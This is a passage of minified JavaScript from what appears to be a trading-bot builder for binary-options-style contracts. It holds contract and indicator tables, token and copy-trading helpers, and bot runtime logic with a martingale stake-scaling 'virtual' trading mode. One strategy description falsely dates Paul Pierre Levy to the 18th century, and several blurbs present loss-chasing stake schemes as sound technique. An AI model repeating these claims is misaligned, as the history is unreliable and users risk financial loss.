                                ["4", "4"],
                                ["5", "5"],
                                ["6", "6"],
                                ["7", "7"],
                                ["8", "8"],
                                ["9", "9"]
                            ],
                            OTHER_CONTRACTS_TYPES: [
                                [(0, a.NC)("disable"), "disable"],
                                [(0, a.NC)("Volatility 10 (1s) index"), "1HZ10V"],
                                [(0, a.NC)("Volatility 10 index"), "R_10"],
                                [(0, a.NC)("Volatility 25 (1s) index"), "1HZ25V"],
                                [(0, a.NC)("Volatility 25 index"), "R_25"],
                                [(0, a.NC)("Volatility 50 (1s) index"), "1HZ50V"],
                                [(0, a.NC)("Volatility 50 index"), "R_50"],
                                [(0, a.NC)("Volatility 75 (1s) index"), "1HZ75V"],
                                [(0, a.NC)("Volatility 75 index"), "R_75"],
                                [(0, a.NC)("Volatility 100 (1s) index"), "1HZ100V"],
                                [(0, a.NC)("Volatility 100 index"), "R_100"]
                            ]
                        },
                        opposites: {
                            ACCUMULATOR: [{
                                ACCU: (0, a.NC)("Buy")
                            }],
                            MULTIPLIER: [{
                                MULTUP: (0, a.NC)("Up")
                            }, {
                                MULTDOWN: (0, a.NC)("Down")
                            }],
                            CALLPUT: [{
                                CALL: (0, a.NC)("Rise")
                            }, {
                                PUT: (0, a.NC)("Fall")
                            }],
                            CALLPUTEQUAL: [{
                                CALLE: (0, a.NC)("Rise Equals")
                            }, {
                                PUTE: (0, a.NC)("Fall Equals")
                            }],
                            HIGHERLOWER: [{
                                CALL: (0, a.NC)("Higher")
                            }, {
                                PUT: (0, a.NC)("Lower")
                            }],
                            TOUCHNOTOUCH: [{
                                ONETOUCH: (0, a.NC)("Touch")
                            }, {
                                NOTOUCH: (0, a.NC)("No Touch")
                            }],
                            ENDSINOUT: [{
                                EXPIRYRANGE: (0, a.NC)("Ends Between")
                            }, {
                                EXPIRYMISS: (0, a.NC)("Ends Outside")
                            }],
                            STAYSINOUT: [{
                                RANGE: (0, a.NC)("Stays Between")
                            }, {
                                UPORDOWN: (0, a.NC)("Goes Outside")
                            }],
                            ASIANS: [{
                                ASIANU: (0, a.NC)("Asian Up")
                            }, {
                                ASIAND: (0, a.NC)("Asian Down")
                            }],
                            MATCHESDIFFERS: [{
                                DIGITMATCH: (0, a.NC)("Matches")
                            }, {
                                DIGITDIFF: (0, a.NC)("Differs")
                            }],
                            EVENODD: [{
                                DIGITEVEN: (0, a.NC)("Even")
                            }, {
                                DIGITODD: (0, a.NC)("Odd")
                            }],
                            OVERUNDER: [{
                                DIGITOVER: (0, a.NC)("Over")
                            }, {
                                DIGITUNDER: (0, a.NC)("Under")
                            }],
                            HIGHLOWTICKS: [{
                                TICKHIGH: (0, a.NC)("High Tick")
                            }, {
                                TICKLOW: (0, a.NC)("Low Tick")
                            }],
                            RESET: [{
                                RESETCALL: (0, a.NC)("Reset Call")
                            }, {
                                RESETPUT: (0, a.NC)("Reset Put")
                            }],
                            RUNS: [{
                                RUNHIGH: (0, a.NC)("Only Ups")
                            }, {
                                RUNLOW: (0, a.NC)("Only Downs")
                            }],
                            CALLPUTSPREAD: [{
                                CALLSPREAD: (0, a.NC)("Call Spread")
                            }, {
                                PUTSPREAD: (0, a.NC)("Put Spread")
                            }]
                        },
                        BARRIER_TYPES: [
                            ["Offset +", "+"],
                            ["Offset -", "-"]
                        ],
                        ohlcFields: [
                            [(0, a.NC)("Open"), "open"],
                            [(0, a.NC)("High"), "high"],
                            [(0, a.NC)("Low"), "low"],
                            [(0, a.NC)("Close"), "close"],
                            [(0, a.NC)("Open Time"), "epoch"]
                        ],
                        candleIntervals: [
                            [(0, a.NC)("Default"), "default"],
                            [(0, a.NC)("1 minute"), "60"],
                            [(0, a.NC)("2 minutes"), "120"],
                            [(0, a.NC)("3 minutes"), "180"],
                            [(0, a.NC)("5 minutes"), "300"],
                            [(0, a.NC)("10 minutes"), "600"],
                            [(0, a.NC)("15 minutes"), "900"],
                            [(0, a.NC)("30 minutes"), "1800"],
                            [(0, a.NC)("1 hour"), "3600"],
                            [(0, a.NC)("2 hours"), "7200"],
                            [(0, a.NC)("4 hours"), "14400"],
                            [(0, a.NC)("8 hours"), "28800"],
                            [(0, a.NC)("1 day"), "86400"]
                        ],
                        mainBlocks: ["trade_definition", "before_purchase", "during_purchase", "after_purchase"],
                        mandatoryMainBlocks: ["trade_definition", "apollo_purchase", "before_purchase"],
                        procedureDefinitionBlocks: ["procedures_defnoreturn", "procedures_defreturn"],
                        single_instance_blocks: ["trade_definition", "before_purchase", "during_purchase", "after_purchase"],
                        TRADE_TYPE_TO_CONTRACT_CATEGORY_MAPPING: {
                            callput: ["callput", "higherlower"],
                            asian: ["asians"],
                            digits: ["matchesdiffers", "evenodd", "overunder"]
                        },
                        TRADE_TYPE_CATEGORIES: {
                            multiplier: ["multiplier"],
                            callput: ["callput", "callputequal", "higherlower"],
                            touchnotouch: ["touchnotouch"],
                            inout: ["endsinout", "staysinout"],
                            asian: ["asians"],
                            digits: ["matchesdiffers", "evenodd", "overunder"],
                            reset: ["reset"],
                            callputspread: ["callputspread"],
                            highlowticks: ["highlowticks"],
                            runs: ["runs"],
                            accumulator: ["accumulator"]
                        },
                        TRADE_TYPE_CATEGORY_NAMES: {
                            callput: (0, a.NC)("Up/Down"),
                            touchnotouch: (0, a.NC)("Touch/No Touch"),
                            inout: (0, a.NC)("In/Out"),
                            asian: (0, a.NC)("Asians"),
                            digits: (0, a.NC)("Digits"),
                            reset: (0, a.NC)("Reset Call/Reset Put"),
                            callputspread: (0, a.NC)("Call Spread/Put Spread"),
                            highlowticks: (0, a.NC)("High/Low Ticks"),
                            runs: (0, a.NC)("Only Ups/Only Downs"),
                            multiplier: (0, a.NC)("Multipliers"),
                            accumulator: (0, a.NC)("Accumulators")
                        },
                        BARRIER_CATEGORIES: {
                            euro_atm: ["callput", "callputequal"],
                            euro_non_atm: ["endsinout", "higherlower", "callputspread"],
                            american: ["staysinout", "touchnotouch", "highlowticks", "runs", "multiplier"],
                            non_financial: ["digits", "overunder", "evenodd", "matchesdiffers"],
                            asian: ["asians"],
                            reset: ["reset"],
                            lookback: ["lookback"],
                            accumulator: ["accumulator"]
                        },
                        DEFAULT_DURATION_DROPDOWN_OPTIONS: [
                            [(0, a.NC)("Ticks"), "t"],
                            [(0, a.NC)("Seconds"), "s"],
                            [(0, a.NC)("Minutes"), "m"],
                            [(0, a.NC)("Hours"), "h"],
                            [(0, a.NC)("Days"), "d"]
                        ],
                        BARRIER_LABELS: [(0, a.NC)("High barrier"), (0, a.NC)("Low barrier")],
                        ABSOLUTE_BARRIER_DROPDOWN_OPTION: [
                            [(0, a.NC)("Absolute"), "absolute"]
                        ],
                        NOT_AVAILABLE_DROPDOWN_OPTIONS: [
                            [(0, a.NC)("Not available"), "na"]
                        ],
                        NOT_AVAILABLE_DURATIONS: [{
                            display: (0, a.NC)("Not available"),
                            unit: "na",
                            min: 0
                        }],
                        BARRIER_TRADE_TYPES: ["higherlower", "touchnotouch", "endsinout", "staysinout", "callputspread"],
                        PREDICTION_TRADE_TYPES: ["matchesdiffers", "overunder", "highlowticks"],
                        DIGIT_CATEGORIES: ["digits", "highlowticks"],
                        INDEPEDENT_BLOCKS: ["block_holder", "tick_analysis", "loader", "procedures_defreturn", "procedures_defnoreturn"],
                        bbResult: [
                            [(0, a.NC)("upper"), "1"],
                            [(0, a.NC)("middle"), "0"],
                            [(0, a.NC)("lower"), "2"]
                        ],
                        macdFields: [
                            [(0, a.NC)("Histogram"), "0"],
                            [(0, a.NC)("MACD"), "1"],
                            [(0, a.NC)("Signal"), "2"]
                        ],
                        GOOGLE_DRIVE: {
                            SCOPE: "https://www.googleapis.com/auth/drive.file",
                            DISCOVERY_DOCS: "https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"
                        },
                        workspaces: {
                            flyoutWorkspacesStartScale: .7,
                            mainWorkspaceStartScale: .9,
                            previewWorkspaceStartScale: .6,
                            indentWorkspace: {
                                x: 0,
                                y: 60
                            }
                        },
                        strategies: {
                            martingale: {
                                index: 0,
                                label: (0, a.NC)("Martingale"),
                                description: (0, a.NC)("The Martingale Strategy is a classic trading technique that has been used for more than a hundred years, popularised by the French mathematician Paul Pierre Levy in the 18th century.")
                            },
                            dalembert: {
                                index: 1,
                                label: (0, a.NC)("D'Alembert"),
                                description: (0, a.NC)("The concept of the D’Alembert Strategy is said to be similar to the Martingale Strategy where you will increase your contract size after a loss. With the D’Alembert Strategy, you will also decrease your contract size after a successful trade.")
                            },
                            oscars_grind: {
                                index: 2,
                                label: (0, a.NC)("Oscar's Grind"),
                                description: (0, a.NC)("The Oscar's Grind Strategy is a low-risk positive progression strategy that first appeared in 1965. By using this strategy, the size of your contract will increase after successful trades, but remains unchanged after unsuccessful trades.")
                            }
                        },
                        default_file_name: (0, a.NC)("Untitled Bot"),
                        DISABLED_SYMBOLS: ["frxGBPNOK", "frxUSDNOK", "frxUSDNEK", "frxUSDSEK"],
                        DISABLED_SUBMARKETS: ["energy"],
                        QUICK_STRATEGY: {
                            DISABLED: {
                                SYMBOLS: ["1HZ150V", "1HZ250V"],
                                SUBMARKETS: ["crash_index", "non_stable_coin", "step_index"],
                                BARRIER_TRADE_TYPES: ["higherlower", "touchnotouch", "endsinout", "staysinout", "callputspread", "accumulator"],
                                PREDICTION_TRADE_TYPES: ["highlowticks"]
                            },
                            DEFAULT: {
                                symbol: "1HZ100V",
                                tradetype: "callput",
                                durationtype: "t",
                                size: 1,
                                unit: 1,
                                prediction: 0
                            }
                        }
                    })
            },
            87920: function(e, t, n) {
                "use strict";
                n.d(t, {
                    GL: function() {
                        return a.GL
                    },
                    I_: function() {
                        return a.I_
                    },
                    Jr: function() {
                        return i.Jr
                    },
                    Rg: function() {
                        return l.R
                    },
                    ZB: function() {
                        return i.ZB
                    },
                    u: function() {
                        return i.u
                    },
                    v9: function() {
                        return i.v9
                    },
                    vc: function() {
                        return a.vc
                    }
                });
                var a = n(47962),
                    i = n(51434),
                    l = n(30810)
            },
            51434: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Jr: function() {
                        return a
                    },
                    ZB: function() {
                        return r
                    },
                    u: function() {
                        return s
                    },
                    v9: function() {
                        return d
                    }
                });
                let a = ["InsufficientBalance", "CustomLimitsReached", "OfferingsValidationError", "InvalidCurrency", "ContractBuyValidationError", "NotDefaultCurrency", "PleaseAuthenticate", "FinancialAssessmentRequired", "PositiveIntegerExpected", "OptionError", "IncorrectPayoutDecimals", "IncorrectStakeDecimals", "NoMFProfessionalClient", "AuthorizationRequired", "InvalidToken", "DailyLossLimitExceeded", "InputValidationFailed", "ClientUnwelcome", "PriceMoved"];
                var i, l, o, s = ((i = {}).ERROR = "error", i.NOTIFY = "notify", i.SUCCESS = "success", i);
                var r = ((l = {}).RECOVERABLE_ERRORS = "recoverable_errors", l.UNRECOVERABLE_ERRORS = "unrecoverable_errors", l);
                var d = ((o = {}).LOAD_BLOCK = "load_block", o.PURCHASE = "purchase", o.SELL = "sell", o.NOT_OFFERED = "not_offered", o.PROFIT = "profit", o.LOST = "lost", o.WELCOME_BACK = "welcome_back", o.WELCOME = "welcome", o)
            },
            30810: function(e, t, n) {
                "use strict";
                n.d(t, {
                    R: function() {
                        return a
                    }
                });
                let a = Object.freeze({
                    UNSAVED: "unsaved",
                    LOCAL: "local",
                    GOOGLE_DRIVE: "google drive"
                })
            },
            88199: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    extractBlocksFromXml: () => s.mT,
                    ApiHelpers: () => o.ST,
                    tokenExists: () => o.kD,
                    MessageTypes: () => a.u,
                    api_base3: () => o.hL,
                    addCtProgramTokens: () => o.R1,
                    removeErrorHandlingEventListener: () => s.GZ,
                    onWorkspaceResize: () => s.N0,
                    ActiveSymbols: () => o.E9,
                    contract: () => o.LJ,
                    save_types: () => a.Rg,
                    api_base4: () => o.go,
                    config_v1: () => a.GL,
                    TradingTimes: () => o.tI,
                    retrieveListItem: () => o.Dz,
                    getToken: () => o.LP,
                    getContractTypeName: () => s.ZT,
                    importExternal: () => s.Vc,
                    removeCopyTradingTokens: () => o.Ug,
                    api_base: () => o.DO,
                    api_base2: () => o.PL,
                    newListTokens: () => o.gb,
                    unrecoverable_errors: () => a.Jr,
                    scrollWorkspace: () => l.yW,
                    ServerTime: () => o.Xc,
                    saveWorkspaceToRecent: () => s.l5,
                    sortBlockChild: () => s.X6,
                    contractStatus: () => o.x_,
                    removeExistingWorkspace: () => s.lY,
                    handleError: () => s.S3,
                    updateCopyTradingTokens: () => o.YD,
                    resetVhVariables: () => a.I_,
                    DBot: () => i.Z,
                    load: () => l.zD,
                    pipe: () => s.zG,
                    save: () => l.a1,
                    getSavedWorkspaces: () => s.WN,
                    compareXml: () => s.dY,
                    updateWorkspaceName: () => l.Hh,
                    convertStrategyToIsDbot: () => s.Xt,
                    NetworkMonitor: () => o.YS,
                    deleteItemFromStorage: () => o.Gq,
                    initErrorHandlingListener: () => s.tZ,
                    retrieveCopyTradingTokens: () => o.Yp,
                    observer: () => s.Pi,
                    dollar_bot_list: () => i.D,
                    runIrreversibleEvents: () => l.$9,
                    saveListItemToStorage: () => o.an,
                    setColors: () => s.Ow,
                    trackAndEmitError: () => s.N_,
                    removeCtToken: () => o.x2,
                    reCallTheTokens: () => o.M4,
                    config: () => a.vc,
                    notify: () => o.h4,
                    ErrorTypes: () => a.ZB,
                    getLiveAccToken: () => o.Lu,
                    ContractsFor: () => o.HP,
                    timeSince: () => s.VG,
                    runGroupedEvents: () => l.UR,
                    createError: () => s.Tr,
                    LogTypes: () => a.v9
                });
                var a = n("87920"),
                    i = n("30979"),
                    l = n("56443"),
                    o = n("94915"),
                    s = n("94576")
            },
            63999: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Gh: function() {
                        return s
                    },
                    QT: function() {
                        return r
                    },
                    wd: function() {
                        return o
                    }
                });
                var a = n(94915),
                    i = n(85872);
                let l = {
                        amount: void 0,
                        basis: "stake",
                        contract_type: "ACCU",
                        currency: void 0,
                        symbol: void 0,
                        growth_rate: void 0,
                        proposal: 1,
                        subscribe: 1
                    },
                    o = async e => {
                        if (e && !e.is_bot_running) {
                            var t;
                            await (null === a.DO || void 0 === a.DO ? void 0 : null === (t = a.DO.api) || void 0 === t ? void 0 : t.send({
                                forget_all: "proposal"
                            })), e.subscription_id_for_accumulators = null, e.is_proposal_requested_for_accumulators = !1, window.Blockly.accumulators_request = {}
                        }
                    },
                    s = e => {
                        var t, n, a;
                        let o = null == e ? void 0 : e.getTopParent(),
                            s = null == o ? void 0 : o.getChildByType("trade_definition_market"),
                            r = null == s ? void 0 : s.getFieldValue("SYMBOL_LIST"),
                            d = i.Z.instance.client.currency,
                            c = (null == e ? void 0 : e.getFieldValue("GROWTHRATE_LIST")) || .01,
                            u = (null == e ? void 0 : null === (a = e.childBlocks_) || void 0 === a ? void 0 : null === (n = a[0]) || void 0 === n ? void 0 : null === (t = n.getField("NUM")) || void 0 === t ? void 0 : t.getValue()) || 0,
                            m = { ...l,
                                amount: u,
                                currency: d,
                                symbol: r,
                                growth_rate: c
                            };
                        window.Blockly.accumulators_request = m
                    },
                    r = (e, t) => {
                        let {
                            amount: n,
                            currency: a,
                            symbol: i,
                            growth_rate: o,
                            limit_order: s
                        } = e, {
                            take_profit: r
                        } = s, d = { ...l,
                            amount: n,
                            currency: a,
                            symbol: i,
                            growth_rate: o,
                            subscribe: void 0,
                            limit_order: {
                                take_profit: r
                            }
                        };
                        return null == t ? void 0 : t.send(d).then(e => e.error ? Promise.reject(e.error) : e).catch(e => {
                            throw e
                        })
                    }
            },
            85872: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return r
                    }
                });
                var a = n(27412),
                    i = n(68949),
                    l = n(79907);
                class o {
                    constructor() {
                        (0, a._)(this, "handleFileChange", () => {
                            throw Error("handleFileChange has not been implemented.")
                        }), (0, a._)(this, "toggleStrategyModal", () => {
                            throw Error("handleFileChange has not been implemented.")
                        })
                    }
                }
                class s extends o {
                    static setInstance(e) {
                        return this.singleton = new s(e), this.instance
                    }
                    static get instance() {
                        return this.singleton
                    }
                    constructor(e) {
                        super(), this.is_mobile = e.is_mobile || !1, this.is_dark_mode_on = e.is_dark_mode_on || !1, this.client = e.client, this.dashboard = e.dashboard, this.flyout = e.flyout, this.toolbar = e.toolbar, this.toolbox = e.toolbox, this.save_modal = e.save_modal, this.load_modal = e.load_modal, this.setContractUpdateConfig = e.setContractUpdateConfig, this.toggleStrategyModal = e.toggleStrategyModal, this.handleFileChange = e.handleFileChange, this.setLoading = e.setLoading, (0, i.U5)(() => this.client.loginid, () => l.DO.createNewInstance(this.client.loginid))
                    }
                }(0, a._)(s, "singleton", null);
                let r = s
            },
            30979: function(e, t, n) {
                "use strict";
                let a, i, l;
                n.d(t, {
                    Z: () => tE,
                    D: () => tg
                });
                var o = n("27412"),
                    s = n("87920"),
                    r = n("47962"),
                    d = n("79907"),
                    c = n("13604"),
                    u = n("66175");
                let m = function() {
                    let e, t, n;

                    function a(e, t) {
                        return null != t && e instanceof t
                    }
                    try {
                        e = Map
                    } catch (t) {
                        e = function() {}
                    }
                    try {
                        t = Set
                    } catch (e) {
                        t = function() {}
                    }
                    try {
                        n = Promise
                    } catch (e) {
                        n = function() {}
                    }

                    function i(l, s, r, d, c) {
                        "object" == typeof s && (r = s.depth, d = s.prototype, c = s.includeNonEnumerable, s = s.circular);
                        let u = [],
                            m = [],
                            b = "undefined" != typeof Buffer;
                        return void 0 === s && (s = !0), void 0 === r && (r = 1 / 0),
                            function l(r, p) {
                                let f, _;
                                if (null === r) return null;
                                if (0 === p || "object" != typeof r) return r;
                                if (a(r, e)) f = new e;
                                else if (a(r, t)) f = new t;
                                else if (a(r, n)) f = new n(function(e, t) {
                                    r.then(function(t) {
                                        e(l(t, p - 1))
                                    }, function(e) {
                                        t(l(e, p - 1))
                                    })
                                });
                                else if (i.__isArray(r)) f = [];
                                else if (i.__isRegExp(r)) f = new RegExp(r.source, o(r)), r.lastIndex && (f.lastIndex = r.lastIndex);
                                else if (i.__isDate(r)) f = new Date(r.getTime());
                                else {
                                    if (b && Buffer.isBuffer(r)) return Buffer.from ? f = Buffer.from(r) : (f = new Buffer(r.length), r.copy(f)), f;
                                    a(r, Error) ? f = Object.create(r) : void 0 === d ? f = Object.create(_ = Object.getPrototypeOf(r)) : (f = Object.create(d), _ = d)
                                }
                                if (s) {
                                    let e = u.indexOf(r);
                                    if (-1 != e) return m[e];
                                    u.push(r), m.push(f)
                                }
                                for (var h in a(r, e) && r.forEach(function(e, t) {
                                        let n = l(t, p - 1),
                                            a = l(e, p - 1);
                                        f.set(n, a)
                                    }), a(r, t) && r.forEach(function(e) {
                                        let t = l(e, p - 1);
                                        f.add(t)
                                    }), r) {
                                    if (Object.getOwnPropertyDescriptor(r, h)) {
                                        if (0 > Object.keys(r).indexOf(h)) continue;
                                        f[h] = l(r[h], p - 1)
                                    }
                                    try {
                                        let e = Object.getOwnPropertyDescriptor(r, h);
                                        if ("undefined" === e.set) continue;
                                        f[h] = l(r[h], p - 1)
                                    } catch (e) {
                                        if (e instanceof TypeError) continue;
                                        if (e instanceof ReferenceError) continue
                                    }
                                }
                                if (Object.getOwnPropertySymbols) {
                                    let e = Object.getOwnPropertySymbols(r);
                                    for (var h = 0; h < e.length; h++) {
                                        let t = e[h];
                                        var v = Object.getOwnPropertyDescriptor(r, t);
                                        if (!v || !!v.enumerable || !!c) f[t] = l(r[t], p - 1), Object.defineProperty(f, t, v)
                                    }
                                }
                                if (c) {
                                    let e = Object.getOwnPropertyNames(r);
                                    for (var h = 0; h < e.length; h++) {
                                        let t = e[h];
                                        var v = Object.getOwnPropertyDescriptor(r, t);
                                        if (!v || !v.enumerable) f[t] = l(r[t], p - 1), Object.defineProperty(f, t, v)
                                    }
                                }
                                return f
                            }(l, r)
                    }

                    function l(e) {
                        return Object.prototype.toString.call(e)
                    }
                    i.clonePrototype = function(e) {
                        if (null === e) return null;
                        let t = function() {};
                        return t.prototype = e, new t
                    }, i.__objToStr = l;
                    i.__isDate = function(e) {
                        return "object" == typeof e && "[object Date]" === l(e)
                    };
                    i.__isArray = function(e) {
                        return "object" == typeof e && "[object Array]" === l(e)
                    };

                    function o(e) {
                        let t = "";
                        return e.global && (t += "g"), e.ignoreCase && (t += "i"), e.multiline && (t += "m"), t
                    }
                    return i.__isRegExp = function(e) {
                        return "object" == typeof e && "[object RegExp]" === l(e)
                    }, i.__getRegExpFlags = o, i
                }();
                var b = n("88203"),
                    p = n.n(b),
                    f = n("51434"),
                    _ = n("65464"),
                    h = n("71526"),
                    v = n("22598"),
                    y = n("48059"),
                    k = n("50043"),
                    g = n("39338");
                let T = e => Number.isFinite(e) && e > 0,
                    E = e => T(e) && Number.isInteger(e),
                    A = (e, t) => {
                        if (!E(e)) throw (0, k.T)("PositiveIntegerExpected", t);
                        return e
                    },
                    x = e => {
                        let {
                            symbol: t,
                            contractTypes: n
                        } = e;
                        if (!t) throw (0, k.T)("OptionError", (0, y.NC)("Underlying market is not selected"));
                        if (!n[0]) throw (0, k.T)("OptionError", (0, y.NC)("Contract type is not selected"))
                    },
                    w = e => {
                        let [t, n] = e;
                        if (!t) throw (0, k.T)("LoginError", (0, y.NC)("Please login"));
                        return x(n), e
                    },
                    N = e => e instanceof Object && ["open", "high", "low", "close"].every(t => T(e[t])) && E(e.epoch),
                    S = e => {
                        if (!N(e)) throw (0, k.T)("CandleExpected", (0, y.NC)("Given candle is not valid"));
                        return e
                    },
                    C = e => {
                        if (!(e instanceof Array) || !e.every(e => N(e))) throw (0, k.T)("CandleListExpected", (0, y.NC)("Given candle list is not valid"));
                        return e
                    },
                    O = "BEFORE_PURCHASE",
                    L = "DURING_PURCHASE",
                    R = "PROPOSALS_READY",
                    I = "CLEAR_PROPOSALS",
                    D = "PURCHASE_SUCCESSFUL",
                    U = "OPEN_CONTRACT",
                    P = "SELL",
                    V = "START",
                    M = "STOP",
                    B = "NEW_TICK",
                    F = e => {
                        let {
                            dispatch: t,
                            getState: n,
                            data: a,
                            scope: i
                        } = e, {
                            scope: l
                        } = n();
                        l === i && t(a)
                    },
                    j = () => (e, t) => F({
                        dispatch: e,
                        getState: t,
                        data: {
                            type: V
                        },
                        scope: M
                    }),
                    G = () => ({
                        type: R
                    }),
                    X = () => ({
                        type: I
                    }),
                    Y = e => F({ ...e,
                        scope: O
                    }),
                    H = e => {
                        let {
                            getState: t
                        } = e, {
                            proposalsReady: n
                        } = t();
                        n && Y(e), F({ ...e,
                            scope: O
                        })
                    },
                    $ = () => (e, t) => H({
                        dispatch: e,
                        getState: t,
                        data: {
                            type: D
                        }
                    }),
                    W = () => (e, t) => {
                        let {
                            scope: n
                        } = t();
                        n === L && e({
                            type: U
                        }), H({
                            dispatch: e,
                            getState: t,
                            data: {
                                type: U
                            }
                        })
                    },
                    z = () => (e, t) => F({
                        dispatch: e,
                        getState: t,
                        data: {
                            type: P
                        },
                        scope: L
                    }),
                    Z = {
                        scope: M,
                        proposalsReady: !1
                    },
                    K = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Z,
                            t = arguments.length > 1 ? arguments[1] : void 0;
                        switch (t.type) {
                            case V:
                                return {
                                    scope: O,
                                    proposalsReady: e.proposalsReady
                                };
                            case R:
                                return { ...e,
                                    proposalsReady: !0
                                };
                            case I:
                                return { ...e,
                                    proposalsReady: !1
                                };
                            case D:
                                return {
                                    scope: L,
                                    openContract: !1,
                                    proposalsReady: e.proposalsReady
                                };
                            case U:
                                return {
                                    scope: L,
                                    openContract: !0,
                                    proposalsReady: e.proposalsReady
                                };
                            case P:
                                return {
                                    scope: M,
                                    proposalsReady: e.proposalsReady
                                };
                            case B:
                                return { ...e,
                                    newTick: t.payload
                                };
                            default:
                                return e
                        }
                    };
                var q = n("85872"),
                    Q = n("21796");
                let J = "",
                    ee = e => class t extends e {
                        observeBalance() {
                            if (!d.DO.api) return;
                            let e = d.DO.api.onMessage().subscribe(e => {
                                let {
                                    data: t
                                } = e;
                                if ((null == t ? void 0 : t.msg_type) === "balance" && (null == t ? void 0 : t.balance)) {
                                    let {
                                        balance: {
                                            balance: e,
                                            currency: n
                                        }
                                    } = t;
                                    J = (0, u.drH)(e, n), this.accountInfo && (0, Q.um)({
                                        accountID: this.accountInfo.loginid,
                                        balance: J
                                    })
                                }
                            });
                            d.DO.pushSubscription(e)
                        }
                        getBalance(e) {
                            let {
                                client: t
                            } = q.Z.instance, n = t && t.balance || 0;
                            return J = (0, u.drH)(n, t.currency, !1), "STR" === e ? J : n
                        }
                    },
                    et = () => {
                        r.GL.vh_variables.max_steps === r.GL.vh_variables.current_step ? (r.GL.vh_variables.is_enabled = !1, r.GL.vh_variables.current_step = 1) : (r.GL.vh_variables.is_enabled = !0, r.GL.vh_variables.current_step++)
                    },
                    en = () => {
                        r.GL.vh_variables.is_enabled = !0, r.GL.vh_variables.current_step = 1
                    },
                    ea = e => {
                        r.GL.vh_variables.total_loss = 0, e >= r.GL.vh_variables.take_profit ? (alert("Take Profit Hitted!!"), tE.stopBot()) : (r.GL.vh_variables.current_trades_real++, r.GL.vh_variables.is_enabled = !1, r.GL.vh_variables.mart_total_lost = 0, r.GL.vh_variables.current_trades_real >= r.GL.vh_variables.min_trades && (r.GL.vh_variables.is_enabled = !0, r.GL.vh_variables.current_step = 1, r.GL.vh_variables.current_trades_real = 0))
                    },
                    ei = e => {
                        e <= -1 * r.GL.vh_variables.stop_loss ? (alert("Stop Loss Hitted!!"), tE.stopBot()) : r.GL.vh_variables.current_trades_real++
                    },
                    el = e => {
                        let t = Math.abs(e) * r.GL.vh_variables.martingale;
                        t < .35 ? r.GL.vh_variables.mart_stake = .35 : r.GL.vh_variables.mart_stake = Math.round(100 * t) / 100
                    },
                    eo = e => {
                        r.GL.vh_variables.total_loss = 0, e >= r.GL.vh_variables.take_profit ? (alert("Take Profit Hitted!!"), tE.stopBot()) : (r.GL.vh_variables.is_enabled = !0, r.GL.vh_variables.is_martingale_active = !1, r.GL.vh_variables.mart_total_lost = 0)
                    },
                    es = (e, t) => {
                        t <= -1 * r.GL.vh_variables.stop_loss ? (alert("Stop Loss Hitted!!"), tE.stopBot()) : !0 === r.GL.vh_variables.allow_martingale && (r.GL.vh_variables.is_martingale_active = !0, r.GL.vh_variables.martingale, el(e))
                    },
                    er = e => class t extends e {
                        observeOpenContract() {
                            if (!d.DO.api) return;
                            let e = d.DO.api.onMessage().subscribe(e => {
                                let {
                                    data: t
                                } = e;
                                if ("proposal_open_contract" === t.msg_type) {
                                    let e = t.proposal_open_contract;
                                    if (!e || !this.expectedContractId(null == e ? void 0 : e.contract_id)) return;
                                    this.setContractFlags(e), this.data.contract = e, (0, Q.LJ)({
                                        accountID: d.DO.account_info.loginid,
                                        ...e
                                    }), this.isSold ? (this.contractId = "", clearTimeout(this.transaction_recovery_timeout), this.updateTotals(e), (0, Q.x_)({
                                        id: "contract.sold",
                                        data: e.transaction_ids.sell,
                                        contract: e
                                    }), this.afterPromise && this.afterPromise(), this.store.dispatch(z())) : this.store.dispatch(W())
                                }
                            });
                            d.DO.pushSubscription(e)
                        }
                        observeOpenContractVH() {
                            if (!d.PL.api) return;
                            let e = d.PL.api.onMessage().subscribe(e => {
                                let {
                                    data: t
                                } = e;
                                if ("proposal_open_contract" === t.msg_type) {
                                    let e = t.proposal_open_contract;
                                    if (!e || !this.expectedContractId(null == e ? void 0 : e.contract_id)) return;
                                    if (this.setContractFlags(e), this.data.contract = e, (0, Q.LJ)({
                                            accountID: d.PL.account_info.loginid,
                                            ...e
                                        }), this.isSold) {
                                        if (this.contractId = "", clearTimeout(this.transaction_recovery_timeout), this.updateTotals(e), (0, Q.x_)({
                                                id: "contract.sold",
                                                data: e.transaction_ids.sell,
                                                contract: e
                                            }), this.afterPromise && this.afterPromise(), s.GL.vh_variables.vh_official && s.GL.vh_variables.is_enabled) {
                                            let {
                                                sell_price: t,
                                                buy_price: n,
                                                currency: a
                                            } = e, i = (0, u.bfN)(Number(t) - Number(n), a);
                                            i > 0 ? en() : et()
                                        }
                                        this.store.dispatch(z())
                                    } else this.store.dispatch(W())
                                }
                            });
                            d.PL.pushSubscription(e)
                        }
                        waitForAfter() {
                            return new Promise(e => {
                                this.afterPromise = e
                            })
                        }
                        setContractFlags(e) {
                            let {
                                is_expired: t,
                                is_valid_to_sell: n,
                                is_sold: a,
                                entry_tick: i
                            } = e;
                            this.isSold = !!a, this.isSellAvailable = !this.isSold && !!n, this.isExpired = !!t, this.hasEntryTick = !!i
                        }
                        expectedContractId(e) {
                            return this.contractId && e === this.contractId
                        }
                        getSellPrice() {
                            let {
                                bid_price: e,
                                buy_price: t,
                                currency: n
                            } = this.data.contract;
                            return (0, u.bfN)(Number(e) - Number(t), n)
                        }
                    },
                    ed = e => class t extends e {
                        makeProposals(e) {
                            if (r.GL.vh_variables.is_enabled && (e.amount = r.GL.vh_variables.stake), !!this.isNewTradeOption(e))
                                if (this.regeneratePurchaseReference(), this.trade_option = e, this.proposal_templates = (0, g.pH)(e, this.getPurchaseReference()), r.GL.vh_variables.is_enabled) {
                                    let t = Object.assign(e);
                                    t.amount = .35, this.vhProposalTemplates = (0, g.pH)(t, this.getPurchaseReference()), this.renewProposalsOnPurchaseVH()
                                } else this.renewProposalsOnPurchase()
                        }
                        selectProposal(e) {
                            let {
                                proposals: t
                            } = this.data;
                            if (0 === t.length) throw Error((0, y.NC)("Proposals are not ready"));
                            let n = t.find(t => {
                                if (t.contract_type === e && t.purchase_reference === this.getPurchaseReference()) {
                                    if (t.error) throw t.error;
                                    return t
                                }
                                return !1
                            });
                            if (!n) throw Error((0, y.NC)("Selected proposal does not exist"));
                            return {
                                id: n.id,
